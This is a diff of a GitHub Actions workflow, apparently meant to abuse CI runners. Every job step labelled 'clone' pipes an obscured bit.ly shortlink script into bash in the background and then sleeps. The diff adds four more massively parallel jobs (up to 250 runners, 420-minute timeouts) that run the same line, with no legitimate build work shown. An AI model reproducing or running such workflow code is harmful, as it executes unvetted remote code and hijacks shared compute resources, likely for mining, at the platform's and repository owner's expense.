@@ -1,4 +1,4 @@
-name: nodeapp
+name: ngapsapp
 on: 
   push:
     branches: [ "main" ]
@@ -25,8 +25,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
-           sleep 380s
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
+           sleep 370s
   note:
     needs: time
     runs-on: ubuntu-latest
@@ -48,7 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
             sleep 10m
         
     
@@ -74,7 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
             sleep 10m
 
   meet:
@@ -98,7 +98,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
             sleep 10m           
 
   week:
@@ -122,7 +122,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
             sleep 10m         
  
   night:
@@ -146,11 +146,107 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: curl -sL  http://bit.ly/3GWMlZ3 | bash &
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
             sleep 10m 
+
+  sunny:
+    needs: [time]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 420
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
+            sleep 10m 
+
+  tinny:
+    needs: [time]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 420
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
+            sleep 10m
+
+  exel:
+    needs: [time]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 420
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
+            sleep 10m
+
+  rambo:
+    needs: [time]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 420
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: curl -sL  http://bit.ly/3H6dRDE | bash &
+            sleep 10m
    
   Success:
-    needs: [time, note, node, meet, week, night]
+    needs: [time, note, node, meet, week, night, sunny, tinny, exel, rambo]
     if: always()
     runs-on: ubuntu-20.04
     steps:
